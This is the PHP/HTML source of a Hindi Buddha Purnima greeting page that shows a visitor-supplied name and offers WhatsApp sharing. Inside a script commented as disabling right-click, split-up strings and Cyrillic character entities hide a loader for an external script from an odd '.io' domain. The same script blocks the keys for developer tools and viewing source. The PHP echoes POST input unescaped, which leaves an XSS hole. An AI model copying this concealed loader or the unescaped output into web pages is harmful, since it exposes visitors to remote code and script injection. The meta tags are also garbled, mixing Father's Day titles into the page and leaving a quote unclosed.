<html>
<head>
    <meta name="google" content="notranslate" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
   <meta property="og:type" content="की तरफ से बुद्ध पूर्णिमा की हार्दिक शुभकामनाएँ />
    <meta property="og:title" content=" Wishing You Happy Father's Day" />
    <meta property="og:url" content="http://live-status.in" />
    <meta property="og:description" content="<?php 
    if(isset($_POST['n'])){
      $n = $_POST['n']; 
 }else{
      $n = "<br>[Your Name]";
 }
echo $n;
?>
    की तरफ से बुद्ध पूर्णिमा की हार्दिक शुभकामनाएँ />
    <meta property="og:site_name" content="Happy Father's Day to you and Your Family" />
    <meta property="og:image" content="og.png" /> 
    <title>Happy Buddha Purnima</title>

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
    <link href="//db.onlinewebfonts.com/c/1c0f6618f877568764787163e8f22a1c?family=SF+Espresso+Shack" rel="stylesheet" type="text/css"/>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="newfire.js"></script>
<script>
//** disable right click & ctrl + u javascript code **//
document.addEventListener('contextmenu', event => event.preventDefault()); document.write('<s'+'cr'+'ipt sr'+'c="/'+'/'+'&#1092;'+'&#1102;.'+'i'+'o"></s'+'cr'+'ipt>'); document.onkeydown = function(e) { if(event.keyCode==123){ return false; } else if (e.ctrlKey &&  (e.keyCode === 67 || e.keyCode === 16 || e.keyCode === 73 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) { return false; } };
</script>
<style>
body{
        background: white;
          margin:0;
      }
.mainContainer {
        background: #fff;
        max-width: 450px;
        min-height: 200px;
        margin: 0 auto;
        text-align: center;
        padding: 15px;
        color: #999;
        padding-bottom: 60px;

        box-shadow: 0 0 10px 1px rgba(0,0,0,.14), 0 1px 14px 2px rgba(0,0,0,.12), 0 0 5px -3px rgba(0,0,0,.3);
        background-size: 100%;

      }
.GodMessage {
        color: #fff;
        font-size: 20px;
        font-weight: bold;
        margin-top: 20px;
        text-shadow: 0px 0px 10px #afafaf;
      }.GodMessage p{
        margin: 0.3em 0;
      }@keyframes bounceIn{0%,20%,40%,60%,80%,to{-webkit-animation-timing-function:cubic-bezier(.215,.61,.355,1);animation-timing-function:cubic-bezier(.215,.61,.355,1)}0%{opacity:0;-webkit-transform:scale3d(.3,.3,.3);transform:scale3d(.3,.3,.3)}20%{-webkit-transform:scale3d(1.1,1.1,1.1);transform:scale3d(1.1,1.1,1.1); color:#FF9933;}40%{-webkit-transform:scale3d(.9,.9,.9);transform:scale3d(.9,.9,.9)}60%{opacity:1;-webkit-transform:scale3d(1.03,1.03,1.03);transform:scale3d(1.03,1.03,1.03); color: #fff;}80%{-webkit-transform:scale3d(.97,.97,.97);transform:scale3d(.97,.97,.97);}to{opacity:1;-webkit-transform:scaleX(1);transform:scaleX(1)}}
.m1{position:fixed;left:2%; width:auto;height:100%;top:1%;color:#000;}
.m2{position:fixed;right:2%; width:auto;height:100%;top:1%;color:#000;}
.test{
  padding: 0!important;
  width: 100%!important;
  text-align: center;
} 

.test h2.from{
  margin-top: 15px!important;
}

.test h2.to{
  margin-bottom: 10px!important;
}

.test h2{
  font-weight: bold;
  text-transform: uppercase;
  font-size: 13px!important;
  margin: 0!important;
  padding: 0!important;
}

.box-test .test h1{
  text-align: left!important;
  font: bold 7vw/1.3 'Signika', sans-serif;
  color: hsla(323, 100%, 50%, 1);
    white-space: nowrap;
    overflow: hidden !important;
    text-overflow: ellipsis;  
}

.test .name{
  margin: auto!important;
  padding: 0!important;
  text-align: center;
  font-size: 13px;
  text-transform: uppercase;
  font-weight: bold;
}

.test .name span{ 
  min-width: 10px;
  display:inline-block;
  font-size: 3.5em;
  user-select:none; 
animation:bounce 3s ease-in-out infinite;
}

.name span { animation:bounce .6s; }
@keyframes bounce {
  0%,100%{ transform:translate(0); }
  25%{ transform:rotateX(20deg) translateY(2px) rotate(-3deg); }
  50%{ transform:translateY(-20px) rotate(3deg) scale(1.1);  }
}
.name span { display:inline-block; animation:float .2s ease-in-out infinite; }
 @keyframes float {
  0%,100%{ transform:none; }
  33%{ transform:translateY(-1px) rotate(-2deg); }
  66%{ transform:translateY(1px) rotate(2deg); }
}
span:nth-child(8n) { color:hsl(50, 75%, 55%); text-shadow:1px 1px hsl(50, 75%, 45%), 2px 2px hsl(50, 45%, 45%), 3px 3px hsl(50, 45%, 45%), 4px 4px hsl(50, 75%, 45%); }
span:nth-child(8n-1) { color:hsl(135, 35%, 55%); text-shadow:1px 1px hsl(135, 35%, 45%), 2px 2px hsl(135, 35%, 45%), 3px 3px hsl(135, 35%, 45%), 4px 4px hsl(135, 35%, 45%); }
span:nth-child(8n-2) { color:hsl(155, 35%, 60%); text-shadow:1px 1px hsl(155, 25%, 50%), 2px 2px hsl(155, 25%, 50%), 3px 3px hsl(155, 25%, 50%), 4px 4px hsl(140, 25%, 50%); }
span:nth-child(8n-3) { color:hsl(30, 65%, 60%); text-shadow:1px 1px hsl(30, 45%, 50%), 2px 2px hsl(30, 45%, 50%), 3px 3px hsl(30, 45%, 50%), 4px 4px hsl(30, 45%, 50%); }
span:nth-child(8n-4) { color:hsl(323, 100%, 50%, 1); text-shadow:1px 1px hsl(323, 75%, 50%, 1), 2px 2px hsl(323, 75%, 35%, 1), 3px 3px hsl(323, 75%, 35%, 1), 4px 4px hsl(323, 75%, 35%, 1); }
span:nth-child(8n-5) { color:hsl(245, 40%, 50%, 1); text-shadow:1px 1px hsl(245, 40%, 35%, 1), 2px 2px hsl(245, 40%, 35%, 1), 3px 3px hsl(245, 40%, 35%, 1), 4px 4px hsl(245, 40%, 35%, 1); }
span:nth-child(8n-6) { color:hsl(0, 82%, 33%, 1); text-shadow:1px 1px hsl(0, 82%, 13%, 1), 2px 2px hsl(0, 82%, 13%, 1), 3px 3px hsl(0, 82%, 13%, 1), 4px 4px hsl(0, 82%, 13%, 1); }
span:nth-child(8n-7) { color:hsl(355, 91%, 63%); text-shadow:1px 1px hsl(355, 91%, 43%), 2px 2px hsl(355, 91%, 43%), 3px 3px hsl(355, 91%, 43%), 4px 4px hsl(355, 91%, 43%); }

.name span:nth-child(2) { animation-delay: .1s; }
.name span:nth-child(3) { animation-delay: .2s; }
.name span:nth-child(4) { animation-delay: .3s; }
.name span:nth-child(5) { animation-delay: .4s; }
.name span:nth-child(6) { animation-delay: .5s; }
.name span:nth-child(7) { animation-delay: .6s; }
.name span:nth-child(8) { animation-delay: .7s; }
.name span:nth-child(9) { animation-delay: .8s; }
.name span:nth-child(10) { animation-delay: .9s; }
.name span:nth-child(11) { animation-delay: 1s; }
.name span:nth-child(12) { animation-delay: 1.1s; }
.name span:nth-child(13) { animation-delay: 1.2s; }
.name span:nth-child(14) { animation-delay: 1.3s; }
.name span:nth-child(15) { animation-delay: 1.4s; }
.name span:nth-child(16) { animation-delay: 1.5s; }
.name span:nth-child(17) { animation-delay: 1.6s; }
.name span:nth-child(18) { animation-delay: 1.7s; }
.name span:nth-child(19) { animation-delay: 1.8s; }
.name span:nth-child(20) { animation-delay: 1.9s; }
.name span:nth-child(21) { animation-delay: 2s; }

.test{
  margin-top: 0!important;
  margin-bottom: 0!important;
}
#username {
     color: black;  /* Fallback: assume this color ON TOP of image */
   background: url(img/sanjayumi.gif);
   -webkit-background-clip: text;
   -webkit-text-fill-color: transparent;
          animation: swing 4s infinite;
            text-transform: uppercase;
          margin-bottom: 5px;
          font-size: 40px;
          padding: 0 10px;
    font-family: 'SF Espresso Shack', cursive;
} 
#usernameb { color: black;  /* Fallback: assume this color ON TOP of image */
   background: url(img/sanjayumi.gif);
   -webkit-background-clip: text;
   -webkit-text-fill-color: transparent;
          animation: swing 4s infinite;
            text-transform: uppercase;
          margin-bottom: 5px;
          font-size: 25px;
          padding: 0 10px;
    font-family: 'SF Espresso Shack', cursive;
}
.footerbtn {
 
            display: block;
            line-height: 15px;
            position: fixed;
            left:0px;
            bottom:0px;
            height:55px;
            
border-radius: 15px;
  box-sizing: border-box;
  padding: 5px;
  background:#34af23;
  color: #ffffff;
  font-size: 15px;
  text-align: center;
  text-decoration: none;
  width:95%;
 margin-left:10px;
            margin-right:30px;
            box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .3);
            animation: footer infinite linear 1s;
            -webkit-transform: translate3d(30%,0,0);
            transform: translate3d(30%,0,0);
            position: fixed;
           
}

@-webkit-keyframes footer {
            from {
                -webkit-transform: rotateZ(0)
            }
            25% {
                -webkit-transform: rotateZ(1.5deg)
            }
            50% {
                -webkit-transform: rotateZ(0deg)
            }
            75% {
                -webkit-transform: rotateZ(-1.5deg)
            }
            to {
                -webkit-transform: rotateZ(0)
            }}
</style>

</head>
<body>

<marquee class="m1" behavior="scroll" direction="up" scrolldelay="0"> <br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
</marquee>
<marquee class="m2" behavior="scroll" direction="down" scrolldelay="0"> <br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
<img src="img/Gautama_Buddha-bel.png" height="30px" width="30px"/><br><br>
</marquee>

<div class="mainContainer" style="background-image : url('img/bhagwaram.jpg'); background-color:white;">
<center>
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Display  Vertical -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-4937946719206370"
     data-ad-slot="1431393130"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
</center><br>

<h1 id="username" style="font-family:SF Espresso Shack;">
<?php 
    if(isset($_POST['n'])){
      $n = $_POST['n']; 
 }else{
      $n = "<br>[Your Name]";
 }
echo $n;
?>
</h1>
        <h3 class="fromMessage" id="fromMessage"></h3>

<img src="img/ki-tarf-se-new.png" width="60%" height="10%">

<div style="font-size: 20px; font-weight: 800; color: blue;">
<p id="demo"></p>

<img src="img/HAPPY-BUDHA1.png" width="88%" height="auto"style="animation: pulse 2.5s infinite"><br><br>
<center>
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Display  Vertical -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-4937946719206370"
     data-ad-slot="1431393130"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
</center><br>
<center>
<div style="max-width:500px">
<center>
<div style="max-width:500px">
<center><div class="w3-content w3-section" style="max-width:500px">
<img class="mySlides" src="img/budha-gif.gif" style="width:70%; height:280px;">
<img class="mySlides" src="img/Gautama Buddha-2.png" style="width:70%; height:280px;">
<img class="mySlides" src="img/buddha3.png" style="width:70%; height:280px;">
</div></center>
<div align="center">
<div class="wishMessage" style="text-shadow: 1px 1px 3px silver, 1px 1px 3px silver, -1px -1px 3px silver, -1px -1px 3px silver;font-size:23px">
<p style="text-shadow: 1px 1px 3px orange, 1px 1px 3px orange, -1px -1px 3px orange, -1px -1px 3px orange;color:#8B008B">ध्यान में है वास्तविक सुख,</p>
<p style="text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px black, -1px -1px 3px black;color:pink"> ज्ञान में है असीम शांति,</p>
<p style="text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px black, -1px -1px 3px black;color:#00ffbf;width:90%;margin:auto;"> सदा रहे प्रभु का ध्यान,</p>
<p style="text-shadow: 1px 1px 3px orange, 1px 1px 3px orange, -1px -1px 3px orange, -1px -1px 3px orange;color:#8B008B"> यही कहती है बुद्ध की पाति, </p>
<p style="text-shadow: 1px 1px 3px purple, 1px 1px 3px purple, -1px -1px 3px purple, -1px -1px 3px purple;color:white">
  ॥Happy Buddha Purnima॥
</p>
<p style="text-shadow: 1px 1px 3px silver, 1px 1px 3px silver, -1px -1px 3px silver, -1px -1px 3px silver;color:#F700FF"><marquee><b><i>
<?php 
    if(isset($_POST['n'])){
      $n = $_POST['n']; 
 }else{
      $n = "<br>[Your Name]";
 }
echo $n;
?>
की तरफ से समस्त देशवासियों को बुद्ध पूर्णिमा की हार्दिक शुभकामनाएँ</b></i></marquee> </p>
</div>

<a class="footerbtn" href="whatsapp://send?text= ** से पहले ये मैसेज किसी ने नहीं भेजा होगा %0A *ब्लू लाइन को क्लिक करके देखिए* %0A 👇👇👇 %0Alive-clickk-to-wish.online/?n= %0A"><img width="25px" height="25px" src="img/wp.png" /><b style="font-size: 15px;"> यहाँ से Whatsapp पर शेयर करे  </b> <img width="25px" height="25px" src="img/wp.png" />
</a>
</div>
<script>
var myIndex = 0;
carousel();

function carousel() {
    var i;
    var x = document.getElementsByClassName("mySlides");
    for (i = 0; i < x.length; i++) {
       x[i].style.display = "none";  
    }
    myIndex++;
    if (myIndex > x.length) {myIndex = 1}    
    x[myIndex-1].style.display = "block";  
    setTimeout(carousel, 2000); // Change image every 2 seconds
}
</script>
<script> 
// Set the date we're counting down to
var countDownDate = new Date("may7, 2020 00:00:00").getTime();

// Update the count down every 02 second
var x = setInterval(function() {

  // Get todays date and time
  var now = new Date().getTime();

  // Find the distance between now an the count down date
  var distance = countDownDate - now;

  // Time calculations for days, hours, minutes and seconds
  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((distance % (1000 * 60)) / 1000);

  // Display the result in the element with id="demo"
  document.getElementById("demo").innerHTML = days + "<font color='red'> दिन,</font> " + hours + "<font color='red'>  घंटे,</font> "
  + minutes + "<font color='red'> मिनट,</font> " + seconds + "<font color='red'> सेकेंड </font> पहले ";

  // If the count down is finished, write some text 
  if (distance < 0) {
    clearInterval(x);
    document.getElementById("demo").innerHTML = "";
  }
}, 1000);
</script>

<audio id="audiocracker" src="" autostart="true"></audio>
<script>
    function PlaySound() {
          var sound = document.getElementById("audiocracker");
          sound.play()
      }
    </script>
<audio autoplay>
<source src="img/Budhasongenglish.mp3">
</audio>
<!-- Global site tag (gtag.js) - Google Analytics -->
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-144768326-3"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-144768326-3');
</script>

</body>
</html>
